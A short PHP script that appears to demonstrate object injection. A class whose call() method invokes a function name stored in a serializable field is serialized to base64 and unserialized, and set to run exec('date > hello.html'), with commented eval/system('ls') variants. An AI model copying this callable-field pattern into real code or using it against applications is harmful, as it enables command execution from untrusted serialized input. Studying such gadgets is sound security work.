<?php

function base64_urlsafe_encode($val) {
	$val = base64_encode($val);
	return str_replace(array('+', '/', '='), array('_', '-', ''), $val);
}

function base64_urlsafe_decode($val) {
	$val = str_replace(array('_','-'), array('+', '/'), $val);
	return base64_decode($val);
}

class Kurenaif {
    private $funcname;
    private $member;

    function __construct($funcname, $member) {
		$this->funcname = $funcname;
		$this->member = $member;
    }
    function set($member) {
        $this->member = $member;
    }
    function get() {
        return $this->member;
    }
	function call() {
		($this->funcname)($this->member);
	}
}

$obj = new Kurenaif("funcname", "hoge");
$obj->set("hogehoge");
echo "--------------------------------------------------\n";
echo var_export($obj);
echo "\n--------------------------------------------------\n";
$enc = base64_urlsafe_encode(serialize($obj));
echo $enc;
echo "\n--------------------------------------------------\n";
$obj = unserialize(base64_urlsafe_decode($enc));
echo var_export($obj);
echo "\n--------------------------------------------------\n";

# eval("system('ls');");
# "eval"("system('ls');");
$obj = new Kurenaif("base64_encode", "system('ls');");
$obj->call();
$obj = new Kurenaif("exec", "date > hello.html");
$enc = base64_urlsafe_encode(serialize($obj));
echo $enc;
echo $obj->call();
$obj = unserialize(base64_urlsafe_decode($enc));
echo var_export($obj);

// $obj = new Kurenaif(function(){eval("system('ls');");}, "touch hello");
// $obj->call();
// $enc = base64_urlsafe_encode(serialize($obj));
// echo $enc;
